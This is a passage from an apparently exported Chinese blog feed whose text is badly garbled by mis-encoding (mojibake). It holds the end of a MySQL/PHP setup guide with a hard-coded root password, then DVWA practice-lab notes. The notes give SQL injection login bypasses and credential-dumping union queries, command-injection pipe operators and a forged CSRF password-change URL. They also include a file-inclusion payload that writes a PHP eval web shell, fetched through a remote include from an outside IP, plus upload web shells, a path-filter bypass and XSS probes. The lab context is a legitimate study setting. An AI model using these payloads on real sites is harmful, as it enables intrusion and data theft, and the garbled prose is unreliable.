src="https://img-blog.csdnimg.cn/20210127214010779.png"></p></li><li><p>ç™»å½•æ•°æ®åº“ï¼š<code>mysql -u root -p</code>ï¼Œè¾“å…¥å¤åˆ¶çš„å¯†ç ï¼ˆæ‰‹åŠ¨è¾“å…¥ï¼‰<img src="https://img-blog.csdnimg.cn/2021012721440381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p></li><li><p>é©¬ä¸Šæ›´æ”¹å¯†ç :<code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;æ–°å¯†ç &#39;;</code>ï¼ˆæ³¨æ„åˆ†å·ï¼‰ï¼Œæäº¤ï¼š<code>commit;</code><br><img src="https://img-blog.csdnimg.cn/20210128094447532.png"></p></li><li><p>é€€å‡ºæ•°æ®åº“ï¼š<code>quit;</code>(/qæˆ–è€…ctrl^z)<br><img src="https://img-blog.csdnimg.cn/20210127231852310.png"></p></li><li><p>å°†mysqlçš„biné…ç½®ç¯å¢ƒå˜é‡ä¸­ï¼ˆæ–¹ä¾¿å¯åŠ¨æ—¶ä¸ç”¨åˆ‡æ¢ç›®å½•ï¼‰</p></li></ul><h1 id="äº”ã€phpè¿æ¥mysql"><a href="#äº”ã€phpè¿æ¥mysql" class="headerlink" title="äº”ã€phpè¿æ¥mysql"></a>äº”ã€phpè¿æ¥mysql</h1><p>æ­¤å¤„ä½¿ç”¨çš„ç‰ˆæœ¬ä¸ºphp7 è¿æ¥æ•°æ®åº“ä¸&lt;5.Xæœ‰å¾ˆå¤§ä¸åŒ</p><ul><li>ä¿®æ”¹php.ini(ä¹‹å‰å·²ç»é…ç½®è¿‡php.iniçš„ä¸€å¤„ext.dir)<br>â‘ å»æ‰ä¸‹é¢è¯­å¥çš„åˆ†å·ï¼š<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">;<span class="hljs-attribute">extension</span>=mysqli<br>;<span class="hljs-attribute">extension</span>=pdo_mysql<br></code></pre></td></tr></table></figure>â‘¡åœ¨extensionä»£ç åŒºä¸‹æ–¹æ·»åŠ ï¼š<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">extension</span>=php_mysqli.dll<br><span class="hljs-attr">extension</span>=php_pdo_mysql.dll<br></code></pre></td></tr></table></figure>æµ‹è¯•phpèƒ½å¦åŠ è½½mysqliæ¨¡å—ï¼š<br>åœ¨apacheçš„htdocsä¸‹å»ºç«‹info.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>æµè§ˆå™¨æ‰“å¼€info.phpï¼š<br><img src="https://img-blog.csdnimg.cn/20210128110957113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">åŠ è½½äº†mysqliçš„æ¨¡å—ï¼Œé…ç½®æˆåŠŸ</li></ul><p>æµ‹è¯•phpèƒ½å¦æ“ä½œ(è¿æ¥)æ•°æ®åº“ï¼š<br>åœ¨apacheçš„htdocsä¸‹å»ºç«‹test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$db</span>=@<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;mysqladmin&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;connect_error)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Connection failed:&#x27;</span>.<span class="hljs-variable">$db</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Connetion successful&lt;/h2&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210128112818969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>è·³æ­¥é…ç½®php.iniçš„æ³¨æ„è¦é‡å¯apacheæœåŠ¡ å‹¿è°“è¨€ä¹‹ä¸é¢„ï¼</strong></p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>environment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/23/DVWA%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>æŸ¥çœ‹ä»£ç  å‘ç°å­˜åœ¨sqlæ³¨å…¥<br><img src="https://img-blog.csdnimg.cn/20210118115849953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>$ query  = â€œSELECT * FROM â€™usersâ€˜ WHERE user = â€˜$ userâ€™ AND password = â€˜$passâ€™;â€;<br>æ„é€  <code>adminâ€™ # </code> ä¸Šå›¾é€‰ä¸­ä»£ç å˜ä¸º<br>$ query  = â€œSELECT * FROM â€™usersâ€˜ WHERE user = â€™adminâ€™ <del># â€˜ AND password = â€˜$passâ€™;â€;</del><br>ï¼ˆ#ä¸ºæ³¨é‡Šç¬¦ï¼‰</p><p>å³å˜æˆè´¦æˆ·ä¸ºadmin å¯†ç ä¸ºç©º ç»•è¿‡ç™»å½•<br><img src="https://img-blog.csdnimg.cn/20210118120743567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>è¿˜å¯ä»¥æŠ“åŒ…burpé‡Œè¿›è¡Œå­—å…¸çˆ†ç ´</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>åˆ©ç”¨ç®¡é“ç¬¦ å‘½ä»¤æ‰§è¡Œæ¼æ´<img src="https://img-blog.csdnimg.cn/20210118124150895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="å‘½ä»¤ç®¡é“ç¬¦çš„è¡¥å……ï¼š"><a href="#å‘½ä»¤ç®¡é“ç¬¦çš„è¡¥å……ï¼š" class="headerlink" title="å‘½ä»¤ç®¡é“ç¬¦çš„è¡¥å……ï¼š"></a>å‘½ä»¤ç®¡é“ç¬¦çš„è¡¥å……ï¼š</h2><blockquote><p>Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š<br>| ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚<br>|| å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚<br>&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</p></blockquote><blockquote><p>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š<br>; æ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚<br>| æ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚<br>|| å½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚<br>&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</p></blockquote><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚<img src="https://img-blog.csdnimg.cn/20210131211950245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>è¾“å…¥ä¸¤æ¬¡ä¸ä¸€è‡´çš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/20210118124802606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">æŸ¥çœ‹urlæ å‘ç°è¿™æ˜¯ä¸ªä¿®æ”¹å¯†ç çš„é“¾æ¥(ä¸€å®šè¦æŸ¥çœ‹é“¾æ¥æ‰€æäº¤çš„å†…å®¹)<br><img src="https://img-blog.csdnimg.cn/20210118125702960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">ç›´æ¥åœ¨urlæ ä¿®æ”¹456ä¸º123<br><img src="https://img-blog.csdnimg.cn/20210118125803421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">å¾—åˆ°password changed<br><img src="https://img-blog.csdnimg.cn/2021011813013135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70">å†æ¬¡æ‰“å¼€DVWAæ—¶ å‘ç°ç™»å½•å¯†ç é”™è¯¯ è¾“å…¥CSRFé‡Œæ”¹æˆçš„123æˆåŠŸç™»å…¥</p><p>è¯´æ˜å¯ä»¥é€šè¿‡ä¼ªé€ urlå®ç°å—å®³è€…ç‚¹å‡»è·¨ç«™é“¾æ¥(æˆ–è€…å†™è¿›ç½‘é¡µæ–‡ä»¶é‡Œ)ä¿®æ”¹å…¶å¯†ç ï¼ˆ123456ï¼‰</p><blockquote><p><a href="http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p></blockquote><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>ç‚¹å‡»å‡ ä¸ªæ–‡ä»¶å‘ç°url<code>http://localhost/DVWA/vulnerabilities/fi/?page=include.php</code><br>éšä¾¿æ”¹ä¸€ä¸‹ï¼š<code>http://localhost/DVWA/vulnerabilities/fi/?page=666.php</code><br><img src="https://img-blog.csdnimg.cn/20210207103351948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ æµ‹è¯•æ˜¯å¦å¯ä»¥è¿œç¨‹å(è¯¥å®‰å…¨ç­‰çº§ä¸‹å¯ä»¥ ä¸å¯ä»¥çš„è¯éœ€è¦é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´)<br>Dç›˜ä¸‹å†™ä¸€ä¸ª1.txtï¼š<br>(æ³¨æ„ï¼Œæˆ‘è¿™å„¿çš„Dç›˜è·¯å¾„ä¸dvwaä½ç½®ä¸åœ¨åŒä¸€å¤„ï¼Œæ­¤å¤„æ¨¡æ‹Ÿäº†è¿œç¨‹åŒ…å«)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>fwrite(fopen(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[123]);?&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://localhost/DVWA/vulnerabilities/fi/?page=D:/1.txt</code><br>è¿œç¨‹åŒ…å«åˆšåˆšçš„1.txtåï¼Œå‘ç°åœ¨<code>DVWA\vulnerabilities\fi</code>ä¸‹å‡ºç°æˆ‘ä»¬è®¾è®¡å¥½çš„ä¸€å¥è¯æœ¨é©¬1.phpï¼Œè¯´æ˜è¿œç¨‹åŒ…å«æˆåŠŸ</p><p><img src="https://img-blog.csdnimg.cn/20210207104000956.png">å®é™…è¿œç¨‹åŒ…å«é•¿è¿™æ ·<code>localhost/DVWA/vulnerabilities/fi/?page=http://110.247.68.66/1.txt</code><br>è¿æ¥èšå‰‘å³å¯</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>æ²¡æœ‰è¿‡æ»¤ä¸Šä¼ æ ¼å¼  æŒ‚ä¸Šä¸€å¥è¯<br><img src="https://img-blog.csdnimg.cn/20210119114311338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">èœåˆ€æ·»åŠ é©¬çš„ç»å¯¹è·¯å¾„å’Œå¯†ç <br><img src="https://img-blog.csdnimg.cn/20210119114656435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210119114801547.png"><br>èœåˆ€è¿æ¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210119115012575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>ç¯å¢ƒé…ç½®é”™è¯¯ å¾…è¡¥å……</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>ä»£ç å¦‚ä¸‹ï¼š<br>$ query  = â€œSELECT first_name, last_name FROM users WHERE user_id = â€˜$idâ€™;â€; <strong>ä¸ºæ•°å­—å‹æ³¨å…¥</strong></p><ul><li>æ‰‹å·¥æ³¨å…¥ï¼š<br><code>â€™ or 1#</code><br><img src="https://img-blog.csdnimg.cn/20210123124222296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">æŸ¥è¯¢æ•°æ®åº“åç§°å’Œç‰ˆæœ¬ï¼š<br><code>1&#39; union select1,database()#</code></li></ul><p><img src="https://img-blog.csdnimg.cn/20210123125952659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">çˆ†å‡ºè´¦å·å¯†ç ï¼š<br><code>1&#39; union select user,password from dvwa.users #</code><br><img src="https://img-blog.csdnimg.cn/20210123164921556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>ä½¿ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š</strong><br>éœ€è¦è·Ÿcookieå‚æ•°ï¼burpé‡ŒæŠ“ä¸€ä¸‹æˆ–è€…F12â†’â†’Consoleâ†’â†’document.cookieå¾—åˆ°å½“å‰é¡µé¢cookie</p><p>æŸ¥è¯¢åˆ°å½“å‰ç”¨æˆ·å’Œæ•°æ®åº“ï¼š<br>ï¼ˆçœ‹èµ·æ¥åç«¯DBMSæ˜¯â€œmysqlâ€ã€‚æ˜¯å¦è¦è·³è¿‡ç‰¹å®šäºå…¶ä»–DBMSçš„æµ‹è¯•æœ‰æ•ˆè´Ÿè½½ï¼Ÿç›´æ¥è·³è¿‡ï¼Œä¸å†æ‰«æå…¶ä»–ç±»å‹çš„æ•°æ®åº“ï¼‰</p><p><img src="https://img-blog.csdnimg.cn/20210123110126686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>æŸ¥è¯¢å½“å‰ç”¨æˆ·ï¼ˆå¹¶ä¸”å†æŸ¥è¯¢äº†ä¸€æ¬¡æ•°æ®åº“ï¼‰ï¼š<br><img src="https://img-blog.csdnimg.cn/2021012311045032.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>ç›´æ¥æ‹–åº“ï¼š<br><img src="https://img-blog.csdnimg.cn/20210123110912656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">å›ç­”é—®é¢˜ï¼š</p><ul><li>æ˜¯å¦è¦å°†å“ˆå¸Œå€¼å­˜å‚¨åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿å…¶ä»–å·¥å…·è¿›è¡Œå¤„ç†ï¼Ÿn</li><li>ä½ æƒ³é€šè¿‡åŸºäºå­—å…¸çš„æ”»å‡»ç ´è§£å®ƒä»¬å—ï¼Ÿy</li><li>ä½ æƒ³ç”¨ä»€ä¹ˆå­—å…¸ï¼Ÿenter</li><li>æ˜¯å¦è¦ä½¿ç”¨å¸¸ç”¨å¯†ç åç¼€ï¼Ÿï¼ˆæ…¢ï¼‰y<br><img src="https://img-blog.csdnimg.cn/20210123111032446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">çˆ†å‡ºï¼š<br><img src="https://img-blog.csdnimg.cn/20210123111120841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>ä¸å‰è€…æ— å¼‚<br><img src="https://img-blog.csdnimg.cn/20210131205918392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSSæ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaã€ VBScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚</p><p><strong>åå°„å‹</strong><br><img src="https://img-blog.csdnimg.cn/2021013121264539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210131212539124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131212822970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>å­˜å‚¨å‹</strong><br><img src="https://img-blog.csdnimg.cn/20210131215016201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131215136514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="Brute-Force-1"><a href="#Brute-Force-1" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><img src="https://img-blog.csdnimg.cn/20210205202516581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>åœ¨ä¸Šä¸€ç­‰çº§åŠ äº†ä¸€sleep(2) åªæ˜¯å¢åŠ äº†çˆ†ç ´çš„æ—¶é—´è€Œå·²</p><h2 id="Command-Injection-1"><a href="#Command-Injection-1" class="headerlink" title="Command Injection"></a>Command Injection</h2><p><img src="https://img-blog.csdnimg.cn/20210205203149810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210205202934944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><p>è¿‡æ»¤è§„åˆ™æ˜¯httpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ä¸­å¿…é¡»åŒ…å«ä¸»æœºå<br><img src="https://img-blog.csdnimg.cn/20210205222605401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>åŒä¸Šä¸€ç­‰çº§å°†ä¼ªé€ urlå†™è¿›ä¸€ä¸ªä»¥ä¸»æœºåå‘½åçš„ç½‘é¡µæ–‡ä»¶å³å¯ä¼ªé€ Refererç»•è¿‡</p><h2 id="File-Inclusion-1"><a href="#File-Inclusion-1" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>åŒæ · æµ‹è¯•å¯ä»¥è¿œç¨‹åŒ…å«å ç›´æ¥å†™ä¸€ä¸ª1.txt ç„¶åæœ¬åœ°åŒ…å« è¿æ¥1.php<br>è€ƒäº†ä»€ä¹ˆï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210207105524332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>ä»£ç å³å°†<code>http:// ../ ..\</code>æ›¿æ¢ä¸ºç©ºå³åˆ é™¤ é‚£ä¹ˆå¯ä»¥åŒå†™ç»•è¿‡ï¼šå¦‚<code>..././</code>è¿‡æ»¤åå˜ä¸º<code>../</code></p><h2 id="File-Upload-1"><a href="#File-Upload-1" class="headerlink" title="File Upload"></a>File Upload</h2><p>æ–‡ä»¶ä¸Šä¼ çš„è¿‡æ»¤åˆ†ä¸ºä¸¤ç§:ä¸€æ˜¯ä¸Šä¼ ç±»å‹ äºŒæ˜¯åç¼€å<br>æ–¹æ³•ä¸€ï¼š<br>æŠ“åŒ… æ”¹åŒ…<img src="https://img-blog.csdnimg.cn/20210207113713123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207113609279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img 